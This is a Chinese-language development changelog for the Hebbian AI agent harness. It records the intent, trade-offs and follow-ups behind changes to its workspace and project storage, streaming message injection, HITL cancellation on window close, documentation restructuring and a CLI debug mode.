# Hebbian 修改时间线（Changelog）

> **这是一个只增不减的修改时间线**。每次有 agent / 人改了仓库，都要在文件**末尾追加**一条记录。
>
> 目的：仓库主人是「想到什么就让 AI 改」的工作模式，需要一份**始终可信的回溯线索**，让下一个 agent 在动手前能看到：
> - 这个想法之前是不是讨论过、改过、又退回来过
> - 当前做法背后有没有一个我看不到的旧理由
> - 我现在的方案会不会和上周的某次改动冲突
>
> 没有这份时间线，AI 只能从代码现状反推意图，**很容易把别人慎重决策的结果当成代码债清掉**。

---

## 写入规则

1. **只追加，不修改、不删除旧条目**。旧条目错了 → 在新条目里更正它（引用旧条目日期）
2. **一次有意义的改动 = 一条**。一次会话里改了多个无关的事就写多条；不要把所有事塞进一条
3. **必须包含**：
   - 日期（`YYYY-MM-DD`，使用绝对日期，不写「今天/昨天」）
   - 改动一句话总结（动词开头：新增 / 重构 / 修复 / 删除 / 调整）
   - **Why**：为什么这么改（用户痛点 / 设计修正 / bug / 路线图推进）
   - **影响范围**：动了哪些 crate / 文件 / surface / 协议
   - **留尾巴**：有没有埋下未完成的事、TODO、可能的回归点（没有就写「无」）
4. **可选**：commit hash、关联 PR、相关 docs 链接
5. 不要写「what code did」级别的 diff —— 那是 git log 的事；这里写**意图、权衡、后果**

---

## 模板（复制改用）

```markdown
### 2026-MM-DD — <一句话总结>

- **Why**: <用户原话或场景；为什么这是问题>
- **改动**:
  - <主要文件 / 模块 1>: <做了什么>
  - <主要文件 / 模块 2>: <做了什么>
- **影响范围**: <哪些 crate / surface / 协议；是否破坏兼容>
- **留尾巴**: <未完成项 / 已知风险 / 后续要做的事；没有写「无」>
- **关联**: <commit / PR / docs 链接，可选>
```

---

## 时间线

<!-- 新条目追加在文件末尾 -->

### 2026-05-19 — 新增 workspace/project 层并让新对话从项目继承 workdir 与 allowed_dirs

- **Why**: 用户希望把会话设置外提成 workspace 概念，项目负责一组默认目录，新建对话从项目复制 workdir / allowed_dirs，但已有会话保持原样可独立修改
- **改动**:
  - [crates/agent-core/src/storage/projects.rs](../crates/agent-core/src/storage/projects.rs): 新增 `~/.hebbian/projects/` 持久化、VS Code workspace 导入、项目创建/保存/删除与单元测试
  - [crates/agent-core/src/storage/sessions.rs](../crates/agent-core/src/storage/sessions.rs): session 增加 `project_id`，新增按 workspace 创建 session 的入口，列表元数据携带 workdir/project
  - [crates/agent-core/src/core_client/mod.rs](../crates/agent-core/src/core_client/mod.rs) / [apps/desktop/src/lib.rs](../apps/desktop/src/lib.rs): 暴露项目相关同步 API 与 Tauri 命令
  - [apps/desktop/frontend/src/desktop/ui/components/Sidebar.tsx](../apps/desktop/frontend/src/desktop/ui/components/Sidebar.tsx): 左侧增加项目/全部筛选、项目列表、项目详情与项目内会话列表
  - [apps/desktop/frontend/src/desktop/ui/components/ChatInput.tsx](../apps/desktop/frontend/src/desktop/ui/components/ChatInput.tsx): 目录 chips 前增加单独的清空所有目录按钮
  - [docs/架构.md](../docs/架构.md): 补充 workspace/project 的持久化目录与同步 API 语义
- **影响范围**: agent-core / desktop / docs；新增项目文件格式与 session 元数据字段，老 session 保持兼容
- **留尾巴**: 前端项目导入/新建的交互还在收尾校验中，项目内会话列表目前按 `project_id` + `workdir` 兜底匹配老数据

### 2026-05-19 — 调整 VS Code workspace 导入路径归一化与项目路径显示

- **Why**: 用户希望导入 VS Code workspace 后，Hebbian 项目文件落在 `~/.hebbian/projects/`，所有 workdir / allowed_dirs 都变成可直接继承的全局路径；左侧和输入框只显示目录/文件名，hover 后能停留复制完整路径；项目内新建对话时输入框不再铺开所有目录
- **改动**:
  - [crates/agent-core/src/storage/projects.rs](../crates/agent-core/src/storage/projects.rs): VS Code workspace 导入时把首个相对路径按 workspace 文件所在目录解析为 workdir，后续相对路径按 workdir 解析为 allowed_dirs；同时写 `<project_id>.code-workspace` 副本
  - [apps/desktop/src/lib.rs](../apps/desktop/src/lib.rs): 导入 VS Code 项目时把原 workspace 文件路径传给 storage 层用于相对路径解析
  - [apps/desktop/frontend/src/desktop/ui/components/HoverHint.tsx](../apps/desktop/frontend/src/desktop/ui/components/HoverHint.tsx) / [PathHint.tsx](../apps/desktop/frontend/src/desktop/ui/components/PathHint.tsx): tooltip 支持 hover 停留 0.5s、文本可选中复制，并新增统一路径显示组件
  - [apps/desktop/frontend/src/desktop/ui/components/Sidebar.tsx](../apps/desktop/frontend/src/desktop/ui/components/Sidebar.tsx) / [ChatInput.tsx](../apps/desktop/frontend/src/desktop/ui/components/ChatInput.tsx) / [workspaceFields.tsx](../apps/desktop/frontend/src/desktop/ui/components/workspaceFields.tsx): 路径列表显示最后一段，完整路径放入可复制 hover；项目会话输入框只显示项目名称 chip
  - [docs/架构.md](架构.md): 补充 VS Code workspace 导入路径归一化和 `.code-workspace` 副本语义
- **影响范围**: agent-core storage / desktop Tauri command / desktop frontend；项目 JSON 仍兼容旧格式，新增 `.code-workspace` 副本不会参与项目列表扫描
- **留尾巴**: `.code-workspace` 当前作为导入后的只读副本保存，不提供单独编辑入口

### 2026-05-10 — 新增「动手前必做」流程 + changelog 时间线

- **Why**: 项目主人的工作模式是「想到什么就让 AI 改」，多次出现 AI 局部最优、违背初衷、与既有设计冲突、给未来埋坑。需要在 CLAUDE.md 里强制 agent 先读文档 + 做全局影响评估，并落一份只增不减的时间线作为回溯依据
- **改动**:
  - [CLAUDE.md](../CLAUDE.md): 顶部新增「⚠️ 动手前必做」三步流程（读 docs / 全局影响四问 / 写 changelog）；「必须遵守的设计规则」加第 11 条；「给后续 agent 的提醒」前置三条强提醒
  - [docs/changelog.md](changelog.md): 新建本文件，定义写入规则 + 模板
- **影响范围**: 仅文档约束，不动代码、不动协议、不影响构建
- **留尾巴**: 无。后续 agent 是否真的遵守，靠每条新改动有没有对应 changelog 条目来检验

### 2026-05-10 — 流式中「立即发送」队列：在 streaming 中插队 user message

- **Why**: 之前 streaming 中只能等当前 turn 结束才发新 user message；用户经常想中途补一句话（"换个方向"/"加个约束"），目前只能 cancel 重发，破坏 turn 上下文。现需要：流式时输入新内容能立刻推到当前 run 的 pending 队列，agent_loop 在下一次 model.request 之前 drain 它们作为新的 user message 加入 transcript（不打断当前 loop，下一个 iteration 立刻可见）
- **改动**:
  - [crates/platform/src/runtime.rs](../crates/platform/src/runtime.rs): `RuntimeHandle` 由单 `CancelFlag` 升级为 `{cancel, pending_inputs: Arc<Mutex<Vec<PendingUserInput>>>}`；新增 `inject_pending_input(request_id, input)`
  - [crates/agent-core/src/harness.rs](../crates/agent-core/src/harness.rs): `RunParams` 多一个 `pending_inputs` 字段透传到 agent_loop
  - [crates/agent-core/src/agent_loop.rs](../crates/agent-core/src/agent_loop.rs): 每次 model.request 前 drain pending_inputs 当作新的 user entry push 进 transcript；run 结束 clean
  - [crates/agent-core/src/session.rs](../crates/agent-core/src/session.rs): 新增 `Session::run_with_pending(cancel, pending_inputs)` 让 surface 把外部 pending 队列共享给 run
  - [apps/desktop/src/chat.rs](../apps/desktop/src/chat.rs): `SendArgs` 加 `pending_inputs` 字段，run 启动时透传
  - [apps/desktop/src/lib.rs](../apps/desktop/src/lib.rs): 新增 `inject_user_message` Tauri 命令——立刻把新 user message append 到 session.json 同时推进 run pending 队列
  - 前端 [InputQueuePanel.tsx](../apps/desktop/frontend/src/desktop/ui/components/InputQueuePanel.tsx) / [ChatInput.tsx](../apps/desktop/frontend/src/desktop/ui/components/ChatInput.tsx) / [useStore.ts](../apps/desktop/frontend/src/desktop/ui/store/useStore.ts) / [types.ts](../apps/desktop/frontend/src/desktop/ui/types.ts) / [tauri.ts](../apps/desktop/frontend/src/desktop/bridge/tauri.ts): 流式中输入框可继续输入并提交，UI 在 ChatInput 上方展示队列；流式 bubble 之后也即时插入这些 user message
  - [ChatView.tsx](../apps/desktop/frontend/src/desktop/ui/components/ChatView.tsx): 把 InputQueuePanel 接进底部布局；流式中 `injectedSinceStream` 列表渲染在 streaming bubble 之后
- **影响范围**: agent-core / platform / desktop 三层；不动 protocol（pending_inputs 只是 surface 与 run 的内部约定，不进 EventPayload）；CLI 没接入
- **留尾巴**:
  - CLI surface 还没用上 pending_inputs（loop 模式可以补一个 `/queue` 命令）
  - 多条 pending 队列模型如何合并到一条 user message 还是分多条 entry 暂未明确——当前实现是各自独立 push 成多条 user entry
  - run 结束 reload session 时前端把 `injectedSinceStream` 清空，但如果 reload 路径异常这条逻辑可能错位

### 2026-05-10 — 关窗时 pending ask 自动按取消收尾 + 问题头部展示完整问题

- **Why**: 桌面端 ask 弹窗未答时直接关窗，进程退出会让 oneshot drop、agent_loop 中断、session.json 丢失整轮 assistant + ask tool_call，下次开会话只剩半截 user message 看不到曾经被问过什么。讨论过完整 LangGraph 式 checkpoint+resume，但代价不成比例（参考 codex / opencode 都没做）。退而求其次：关窗 = 把 pending ask 当「用户取消」收尾、模型在 transcript 里能看到 cancelled tool_result，UI 也显示「取消」答案
- **改动**:
  - [crates/agent-core/src/dispatch.rs](../crates/agent-core/src/dispatch.rs) `spawn_ask`: 把 `ToolCallFinished` emit 提到 cancel-flag 检查之前。原来 cancel flag 一设直接 `return Err`，UI 看不到取消答案；现在不论 X 按钮、ESC、关窗，事件流里都有完整的 `UserQuestionAnswered + ToolCallFinished("[用户取消了提问]")`，observer 把这条结果落到 session.json 的 `tool_calls[i].result`
  - [crates/platform/src/runtime.rs](../crates/platform/src/runtime.rs): 新增 `cancel_all()` / `has_active_runs()`，关窗时批量取消所有 in-flight run
  - [apps/desktop/src/hitl.rs](../apps/desktop/src/hitl.rs): `HitlState` 新增 `cancel_all_pending()`（去重把所有 gate 的 pending 按取消 resolve）/ `has_pending()`
  - [apps/desktop/src/lib.rs](../apps/desktop/src/lib.rs): `WindowEvent::CloseRequested` 拦截——若有 pending HITL 或活跃 run，`prevent_close` + cancel_all_pending + cancel_all flag + 起 std::thread 轮询 2s 等 `persist_interrupted_assistant_output` 写盘 → 关窗
  - [apps/desktop/frontend/src/desktop/ui/components/UserQuestionPopup.tsx](../apps/desktop/frontend/src/desktop/ui/components/UserQuestionPopup.tsx): 头部由 `items-center + truncate` 改 `items-start + whitespace-pre-wrap`，长 question 不再被 ... 截断
  - [crates/agent-core/src/tools/mod.rs](../crates/agent-core/src/tools/mod.rs): `ask_tool_definition` 描述加明确禁令——禁止「其他/让我重新描述/以上都不是/自由回答/再想想」之类兜底元选项（UI 已有自由输入框）
- **影响范围**: agent-core / platform / desktop。不动 protocol。强制 kill 进程仍会丢——这是合作式关窗的合理边界
- **留尾巴**:
  - 真正的 HITL checkpoint+resume（LangGraph interrupt 范式）暂不做。讨论中明确了它的代价：sibling tool_call 并发取消语义、snapshot 漂移、热路径 IO 增加、半成品 checkpointer 不如不做。等真有用户反馈再启
  - `handle_close_with_pending_hitl` 用 `std::thread::sleep` 轮询而非 tokio sleep，是因为 desktop 没有直接 tokio dep；性价比够用
  - 多个 session 同时活跃时 `cancel_all` 是真的全杀，没有「只杀当前 session」的粒度——目前 desktop 也不支持多窗口

### 2026-05-10 — 新建 PROJECT.md 作为新的 source of truth + 文档体系治理

- **Why**: 仓库存在三大文档问题：(1) architecture.md (77KB) + hebbian-harness-detailed-design.md (73KB) 两份巨大「目标态」互相漂移没人维护；(2) M1 进度有三套互不对齐的编号（CLAUDE.md 1-14 / architecture #1-#33 / todos M1 #N）；(3) 「目标态」混入大量空想 struct（ContextEngine / RunTree / Aggregator）让读者误以为已实现。需要一份「站在今天看仓库」的事实文档。同时把已知的产品 bug（AllowAndRemember Project/Global 死按钮、compact 末尾连排 user 致 Anthropic 400、mpsc unbounded）和半作品（TurnContext / MaxIterations / ask 特判）按 P0–P3 重新排过
- **改动**:
  - 新建 [docs/PROJECT.md](PROJECT.md)：10 节 ~600 行，含一句话定位 / 仓库地图 / 术语 / 5 条核心数据流（含新加的 pending_inputs 流） / 真实在用 vs 协议先行的 Op&Event 表 / 16 项已实现功能详细说明 / 4 档优先级（P0–P3 + FR）的待办清单（每项含现状 / 痛点 / 关键设计 / 影响面）/ 12 条已知不合理点 + 改动建议 / 自测命令（含桌面端人工验证清单）/ 文档体系治理规则
  - 文档分工新规则（写在 PROJECT.md 顶部 + §10）：PROJECT.md = source of truth；architecture.md 留作目标态参考、冲突时以 PROJECT 为准；详细设计文档只在追根溯源时翻
  - 不动代码、不动协议、不动 architecture.md / todos.md（保留旧文档供回溯）
- **影响范围**: 仅文档结构。后续改动统一去 PROJECT.md §6/§7/§8 维护
- **留尾巴**:
  - architecture.md / hebbian-harness-detailed-design.md 没归档——下次大改时再决定是 deprecate 还是删（避免一次性大动作）
  - todos.md 没合并到 PROJECT.md §7——保留扁平视角；新增 todo 同时落两处（这是个长期协调成本，等下次盘点再决定要不要去掉 todos.md）
  - CLAUDE.md 顶部的「⚠️ 动手前必做」还指向 architecture.md / todos.md，等读者习惯 PROJECT.md 后再调整指向

### 2026-05-11 — 新建 设计详解.md：教学性视角的 Rust 项目设计讲解

- **Why**: 项目主人是 Rust 新手，看 PROJECT.md（紧凑地图）和 architecture.md（目标态）都有概念门槛——`Arc<T>` / `mpsc` / `oneshot` / `async fn` / `dyn Trait` 这些 Rust 行话没解释，trait + 装饰器模式读起来卡壳。需要一份「同一片地图的导游词」，把每个设计点讲透：是什么、Rust 怎么写的、为什么这么写、现状评价、怎么改
- **改动**:
  - 新建 [docs/设计详解.md](设计详解.md)：15 节 ~900 行
    - §1 Rust 行话小词典（trait/impl/Arc/Mutex/mpsc/oneshot/async/Box<dyn>/Result/Option/Send/Sync/cargo+crate+workspace）
    - §2-§12 按模块讲解（三层骨架 / 事件流 / 协议 / 工具系统 / HITL / 上下文管理 / Model Gateway / Hooks / Recorder / Observability / Surface），每节都按 「是什么 → Rust 实现 → 怎么工作 → 现状评价 → 怎么改」 五段式
    - §13 总账：P0-P3 + FR + 文档体系不合理点，所有问题汇总改法
    - §14 建议改动顺序：12 步实操路线，每步预估工时
    - §15 怎么读代码：从浅到深 9 个文件顺序 + 用 mock 跑现场看数据的 tip
  - 与 [PROJECT.md](PROJECT.md) 分工明确：PROJECT.md 是地图、信息密度高；设计详解.md 是导游词、教学性强。事实冲突时以 PROJECT.md 为准（在顶部声明）
- **影响范围**: 仅文档。不动代码、不动协议
- **留尾巴**:
  - 现在文档已经有 4 份相关联：CLAUDE.md（入口）/ PROJECT.md（地图）/ 设计详解.md（教程）/ architecture.md（目标态）。短期 OK，但长期维护成本叠加——下次大改时合并到 2 份（CLAUDE.md + PROJECT.md+教程合一）
  - 设计详解.md 的 Rust 词典是「项目专用」精选，没覆盖完整 Rust 语言；读者需要更深时仍要查 Rust Book

### 2026-05-11 — 新建 架构.md：按用户想法重组的目标态架构 + 5 个参考项目取舍

- **Why**: 用户明确提出新架构想法：(1) CLI 和桌面对话场景只与 agent_core 走事件流；(2) 非对话场景（配置供应商 / 读对话历史 / 配置项目）UI 不同但底层代码必须一样；(3) agent_core 是完整大脑（loop / 派发 / 上下文 / HITL / 观测 + **审批必须持久化到项目和全局，不只是内存**）；(4) model_gateway 接模型但 agent_core 内部允许做特定模型适配（如 DeepSeek 把 thinking 从 content 拆出来）。同时要求结合 claude-code-haha / codex / opencode / openhanako 的设计。现有的 architecture.md 是过度设计的目标态、PROJECT.md 是现状描述，都不是用户想要的「按我想法的目标态」
- **改动**:
  - 新建 [docs/架构.md](架构.md)：12 节
    - §0 设计目标 + 4 参考项目取舍表（codex 协议化 RPC / opencode core-as-SDK / openhanako 三层简洁 / cc-haha 反面教材）
    - §1 行话翻译表：把所有 Rust / 项目内部行话翻译成 Python/Go 类比（trait/Arc/Mutex/mpsc/oneshot/async/Box<dyn>/emit/match/Op/Result/Option）
    - §2 三层架构图（Surface / CoreClient / Agent Core + Model Gateway / Storage / Observability）
    - §3 通信契约：**双通路**（对话事件流 + 同步 API），列出同步 API 的具体方法清单（供应商 / 历史 / 项目 / 权限 / agent 配置 / 用量 / skills）
    - §4 Agent Core 11 个内部模块详解，每个 是什么/当前/改成怎样，包含两个新模块：**PermissionStore（§4.6 持久化审批）** + **ModelFeatureAdapter（§4.11 DeepSeek thinking 拆解放这里）**
    - §5 Model Gateway 装饰器链：原始 provider → InstrumentedClient → ModelFeatureAdapter → NamedClient
    - §6 Storage 统一持久化层（settings / sessions / permissions / blobs 四类）+ 数据目录布局
    - §7 **Surface 共享层 CoreClient trait**：LocalCoreClient（本地）+ HttpCoreClient（远程，未来）两种实现；桌面 Tauri command 和 CLI subcommand 背后调同一份函数
    - §8 5 个具体数据流场景（发消息 / 切供应商 / 读历史 / 改项目设置 / 持久化审批命中）
    - §9 迁移路线 9 步，每步独立可工作（最先 P0 修 bug，再落 PermissionStore，再抽 CoreClient，再 ModelFeatureAdapter，再 BlobStore，再 prompt cache）
    - §10 8 条不可违反原则
    - §11 迁移后的文件结构（新增 `crates/storage` + `agent-core/model_adapters/` + `agent-core/core_client.rs`）
    - §12 7 个决策点等用户回答
- **影响范围**: 仅文档。不动代码、不动协议
- **留尾巴**:
  - 这份是「目标态」与 architecture.md 关系待理清——可能后者最终归档，但本次不动
  - §12 的 7 个决策点需要和用户单独讨论后再开工
  - CoreClient trait 的具体方法签名还是粗粒度，落地时要逐个细化

### 2026-05-11 — 重写架构.md：按项目主人逐条反馈完整落地新设计 + 参 CodeIsland/codex/opencode

- **Why**: 项目主人对前一版架构.md 给了 10+ 条具体反馈，要求按这些反馈写一份「更详细」的文档。关键点：(1) 不要加 server 目录，保留 apps/crates 布局；(2) 不做"一行代码对照"，详设阶段再讲；(3) Session/Run/Turn 要多举例 + 说清跟压缩的关系；(4) 派发器审批算 HITL 一种；(5) Tool 接口简化为 spec+invoke，权限解耦，引入 AutoMode（仅 opus-4-7）；(6) 内置工具用驼峰，MAX_STEPS=100；(7) 项目级审批跟 session jsonl 走，全局存 ~/.hebbian/permissions.json；(8) 压缩工件落 txt/md，LLM 可 read；(9) hooks 参 CodeIsland 11 点位；(10) jsonl 是对话历史唯一文件；(11) 数据目录 ~/.hebbian 共享；(12) Desktop/CLI 设置存两份；(13) SDK 简单→TUI 完整，参考 codex/opencode；(14) Prompt 太长→重构生产可用
- **调研**: 看了
  - `other/CodeIsland/Sources/CodeIsland/Resources/codeisland-remote-hook.py` 的 EventNormalizer——拿到完整 11 点位标准
  - `codex-rs/tools/src/` 的工具列表（agent_job/agent/apply_patch/plan/goal/local 等）
  - `opencode/packages/opencode/src/tool/`（edit/glob/grep/read/shell/skill/task/todo/lsp/mcp-websearch 等）
  - 三个项目的 system prompt 大小：codex 68 行、cc-haha 68 行、opencode 36 行——Hebbian 现 276 行偏长
- **改动**:
  - 完全重写 [docs/架构.md](架构.md)，从 ~1080 行到 ~1500 行（更详细）
  - 新增章节：
    - §4.4 工具系统详解：4.4.1 Tool 接口简化 / 4.4.2 effects 分析与权限解耦 / 4.4.3 RunMode 4 种 / 4.4.4 AutoMode 实现（含 judge prompt）/ 4.4.5 完整工具列表（驼峰命名）/ 4.4.6 MAX_STEPS=100 / 4.4.7 命名规范
    - §4.6 PermissionStore：三层 scope 存储位置（Project 跟 jsonl + 全局 ~/.hebbian/permissions.json）+ 数据结构 + 决策树
    - §4.7 Context Engine 增加压缩工件落盘：tool_results/<call_id>.txt + compactions/compact-<ts>.md，LLM 通过 read 按需取
    - §4.8 Hook 11 点位（参 CodeIsland）+ 4 内置可改 state hook + socket+JSON 互操作
    - §4.9 Recorder = 对话历史唯一文件（jsonl 同时存 transcript/event/PermissionRule/Marker）
    - §4.10 Trace UI 设计占位（远期）
    - §4.11 ModelFeatureAdapter（DeepSeek thinking 拆解）
    - §7.3 设置分离设计：CoreClient 接口一份、surface_settings 存两份
    - §8 TUI 设计（参 codex ratatui，apps/cli 内部加 tui/ 模块）
    - §9 System Prompt 体系：三段式 + cache 边界 + 重写计划
  - 修订章节：
    - §4.1 Session 与压缩的关系（compaction policy 是 Session 配置）
    - §4.2 Run/Turn/Step 给了 4 个具体例子（纯文本/单工具/插队/长循环）
    - §4.3 Rust 这么做的好处/坏处类比 Python/Go 解释
    - §6 ~/.hebbian 完整目录布局（含每段对话的配套目录）
  - 8 条设计原则升级为 12 条（加 jsonl 唯一文件 / 驼峰命名 / MAX_STEPS / 压缩不丢）
  - §13 决策点扩到 10 个
  - §14 迁移路线扩到 13 步（含 TUI / 系统 prompt 重构 / todo/task 工具）
- **影响范围**: 仅文档。不动代码、不动协议
- **留尾巴**:
  - D1（Project 审批存哪里）跟传统 IDE 工具语义不同，需要主人最终确认
  - System prompt 重写正文留到详设阶段单独 docs/system-prompt.md
  - TUI 具体组件设计待详设
  - Trace UI 是远期，先占位

### 2026-05-11 — 架构.md 第三轮重写：合并主人所有反馈、敲定所有决策

- **Why**: 主人对前一版架构.md 又给了详细反馈：
  - 命名：platform 改 common；工具用 PascalCase 不是 camelCase；HitlGate/HitlState 命名其实没冲突，不要瞎改
  - Step 划分：ModelStep + ToolStep 分开，不能合并；插队时机在 ToolStep 后不是 ModelStep 后
  - RunMode 4 种正名：AskBeforeEdits / EditAutomatically / PlanMode / AutoMode；mode 不能进 system prompt（破坏 cache）；走 SEMI 段 + 工具过滤
  - AllowScope 3 种：Once / Session / Global；Run scope 等价 Session 合并
  - 压缩 tier 化要诚实说优缺点；按需检索三管齐下；压缩工件落 txt/md
  - session 目录化（不要文件+目录分离）；session_id = {yyyymmddHHmm}-{uuid}
  - 流式 partial sidecar 保中断恢复（不是简单 Done 时落盘）
  - 文件锁必加（CLI+Desktop 真并发）
  - Prompt 单独目录 + md 文件 + 用户只能覆盖 persona
  - PlanMode 退出：上一个模式是 AutoMode 则 10s 倒计时自动切，其他手动切
  - codex sub-item 调研：扁平 3-variant 够用不抄
- **调研**:
  - codex `ResponseItem` enum：12+ variant 细粒度拆分（Message/Reasoning/FunctionCall/FunctionCallOutput/LocalShellCall/CustomToolCall/...），跟我们扁平结构对比
  - 三家 system prompt 大小：codex 68 行 / cc-haha 68 行 / opencode 36 行（hebbian 现 276 行偏长，重构计划合理）
  - codex 工具列表 vs opencode 工具列表对比，确认 Hebbian 13 个工具的选择
- **改动**:
  - 完全重写 [docs/架构.md](架构.md)，从 ~1500 行扩到 ~2100 行（更详细 + 所有反馈整合）
  - **核心修正**：
    - 命名：crates/platform → crates/common；工具 13 个全 PascalCase（Ask/Bash/PowerShell/Read/Write/Edit/Glob/Grep/Skill/WebSearch/Fetch/TodoWrite/ExitPlanMode）
    - Step：ModelStep 和 ToolStep 分开；MAX_STEPS=100 只数 ToolStep；插队时机精确化（ToolStep 后 + Turn 边界）
    - Mode：mode 不进 system prompt（保 cache）；走 SEMI 段 runMode/runModeHint + ModelRequest.tools 过滤；切 mode 不重建 system prompt
    - AllowScope：3 种（Once/Session/Global），Session 不再叫 Project，UI 中文显示
    - HitlGate/HitlState 名字保留——明确两者职责完全不同不冲突
    - 流式：partial sidecar 方案（session/partial/<msg_id>.partial.jsonl）保中断恢复
    - session 目录化：每段对话一个目录含 session.jsonl + meta.json + tool_results/ + compactions/ + plans/ + partial/
    - 文件锁：fs2/fd-lock，每文件独立 lock；write_atomic / append_jsonl 都加锁
    - Prompt：内置 6 个 md（base_system/tools_guide/context_recall/communication/persona/automode_judge）+ include_str! 编译进二进制；用户只能覆盖 persona
    - PlanMode 退出：之前 AutoMode → 10s 倒计时；其他模式 → 用户手动切；ExitPlanMode 工具仅 PlanMode 时注入
    - 压缩 tier 化诚实评估：列了优缺点（Tier 划分是经验主义，用户可覆盖 tier_overrides）
    - 按需检索 prompt 设计：context_recall.md 全文写出（编译进二进制）
  - 13 步迁移路线，每步独立交付，推荐 Step 6（Tool 接口简化）第一开工
- **影响范围**: 仅文档。不动代码、不动协议
- **留尾巴**:
  - system prompt 详细文本留 docs/system-prompt.md 单独写
  - architecture.md / hebbian-harness-detailed-design.md 还没归档；本轮没动避免一次性大改
  - 13 步迁移路线工时估算偏乐观，落地时可能扩展
  - PlanMode 工具过滤 + ExitPlanMode 工具的实现细节（如 plan markdown 格式约定）留详设阶段

### 2026-05-11 — 文档体系收束：架构.md 成为唯一设计准则 + 删冗余文档 + 重写 CLAUDE.md / compaction.md

- **Why**: 项目主人确认架构.md 已敲定，要求：
  - 架构.md 作为唯一设计准则
  - 其他过渡性文档（PROJECT.md / 设计详解.md / architecture.md / hebbian-harness-detailed-design.md / 随记.md）不再保留，避免多份文档漂移
  - 仅保留 changelog.md（时间线）与 compaction.md（横向调研背景资料）
  - CLAUDE.md 改为强制执行「修改前评估 + 修改后入 changelog」的协作准则
  - 架构.md 去除对话式表达，写成正式设计文档
  - 参考项目对比写得更详细（多维度逐项对照）
- **改动**:
  - 删除 5 个旧文档：
    - `docs/PROJECT.md`（现状描述，被架构.md §14 迁移路线覆盖）
    - `docs/architecture.md`（旧目标态 77KB，过度设计且与新版架构.md 冲突）
    - `docs/hebbian-harness-detailed-design.md`（73KB 详细设计，部分过时）
    - `docs/设计详解.md`（Rust 新手教程，主人非新手）
    - `docs/随记.md`（已合并到 todos / 架构.md）
  - 重写 [docs/架构.md](架构.md)：
    - 去除全部对话式表达（"你说"/"我推荐"/"抄 cc-haha"等 16 处）
    - 改为正式设计文档语言（"本设计采用"/"沿用 X"/"与 Y 一致"）
    - 新增 §16 综合参考项目对比（12 个子节，逐项对照 claude-code-haha / codex / opencode / openhanako / CodeIsland）
    - §1 文档语言风格说明
    - §13 决策记录表（去掉"拍板"等口语化用词）
    - §14 迁移路线复杂度（替代之前的"工时估算"，更客观）
    - §15 推进流程（按 Step 单独产文档的规范）
  - 重写 [docs/compaction.md](compaction.md)：
    - 与架构.md §4.7 对齐
    - 保留三家参考调研（claude-code-haha 多层防线 / codex 双实现 / opencode 简单触发）作为背景资料
    - 新增 §5 与三家参考项目的对照表（说明 Hebbian 取舍）
    - 新增 §6 实施参考（指向 step-9-compaction.md 与 system-prompt.md 详设文档）
  - 重写 [CLAUDE.md](../CLAUDE.md)：
    - 顶部声明架构.md 为唯一设计准则
    - 「⚠️ 任何修改前必做」5 步流程：定位章节 / 设计影响评估 5 问 / 实施约束 / 验证命令 / 追加 changelog
    - 「与用户讨论的规则」段：禁止未经确认直接执行违反架构.md 的修改；即使用户强烈要求也必须先讲清利害再确认
    - 保留开发命令清单与 graphify 段
    - 去除大量过时章节（M1/M2/M3/M4 进度 / 现状描述 / Harness API 示例 / 已知漂移点等，全部已迁入架构.md 或不再有效）
- **影响范围**: 仅文档。不动代码、不动协议
- **留尾巴**:
  - 架构.md `image/` 目录保留（未来章节可能引用 4.4.3 截图）
  - system prompt 详细文本（架构.md §9 描述形状）仍待在 `docs/system-prompt.md` 单独产出
  - 各 Step 详细设计文档（`docs/step-{N}-{name}.md`）尚未开始，将按架构.md §14 路线顺序产出
  - changelog 已积累 9 条历史记录，无需精简（其本身就是只增不减）

### 2026-05-11 — 复原 docs/随记.md（误删后恢复）

- **Why**: 项目主人确认前一轮"删冗余文档"误删了随记.md。该文件是产品 idea 备忘录，部分想法已被架构.md 吸收（流式插队 / 上下文落盘 / ask 用户 / 设置分离），部分仍是未排期愿望（skill 商城 / git tree / AST 加速 grep / IDE 显示 diff），有保留价值
- **改动**:
  - 复原 [docs/随记.md](随记.md) 原始内容（10 条产品 idea，按主人原话保留）
- **影响范围**: 仅文档。文档体系定位：架构.md 是设计准则、changelog 是时间线、compaction.md 是调研背景、随记.md 是未排期 idea 备忘
- **留尾巴**:
  - 随记里的想法是否要排期 / 何时进入架构.md，需要按需评估
  - 「git tree」「IDE 显示 diff」「skill 商城」等远期能力暂未纳入架构.md §14 迁移路线

### 2026-05-11 — CLI 单次调试模式 + Resume + Auto-Approve + 删 Mock

- **Why**: 项目主人提出新设计想法——CLI single 模式应当：(1) 输出格式与 TUI 一致，便于 LLM 自调试 / CI 端到端验证；(2) 遇 HITL 立即退出并在终端留下 HITL 痕迹；(3) 支持 `--resume <sid>` 在已有 session 上追加 user message；(4) 支持 `--auto-approve` 自动通过审批。同时确认：所有调用真实模型，不再保留 mock 模式。这套能力组合让 LLM 可以程序化验证 agent_core 与 CLI/TUI 的运行稳定性
- **流程**: 按 CLAUDE.md「⚠️ 任何修改前必做」5 步评估，确认与架构.md 不相悖、属于新增设计、影响 §8 / §10 / §12 / §13 / §16，待主人逐项拍板后实施
- **改动**:
  - [docs/架构.md](架构.md) §8.2 模块布局：新增 `render/` 共用渲染层（TerminalRenderer + RatatuiRenderer），TUI 与 single 共用
  - §8.3 启动方式：完整重写
    - §8.3.1 模式总览（5 种模式，明确不提供 mock）
    - §8.3.2 单次调试模式：TUI 格式输出 + HITL 立退 + partial sidecar 自动落盘
    - §8.3.3 `--resume <sid>` 行为：load_session + banner + 不重放历史
    - §8.3.4 `--auto-approve` 行为：仅 CLI observer 层生效，AllowOnce 不写 PermissionStore，不覆盖 Ask，isatty stderr 警告
    - §8.3.5 退出码：0 / 1 / 42 / 43 / 130 语义固定
    - §8.3.6 输出格式示例（含 auto-approved 标记）
  - §8.5 与参考项目对比：新增「单次调试模式」与「Mock 模式」两行（前者本设计独有，后者不提供）
  - §10 数据流场景：新增 §10.6 / §10.7 两个调试场景，原 §10.6 改为 §10.8
  - §12 关键原则汇总：新增第 13 条「CLI 退出码语义化」+ 第 14 条「所有调用真实模型，不提供 mock」
  - §13 决策记录：新增 10 行（8.3.2 / 8.3.3 / 8.3.4 / 8.3.5 等所有 CLI 调试相关决策）
  - §16.12 综合评估：「本设计相对参考项目的优势」新增第 7 条（CLI 单次调试模式独有）
- **影响范围**: 仅文档。后续实施需动 apps/cli（重写 single.rs + 新增 render/ + 删 --mock 参数）。core / protocol / storage 不动。CoreClient.load_session 与 AllowOnce 已存在，无需新 API
- **留尾巴**:
  - apps/cli 端实施（render/ 共用层、single.rs 重写、删 --mock 参数）待 §14 迁移路线 Step 13 阶段
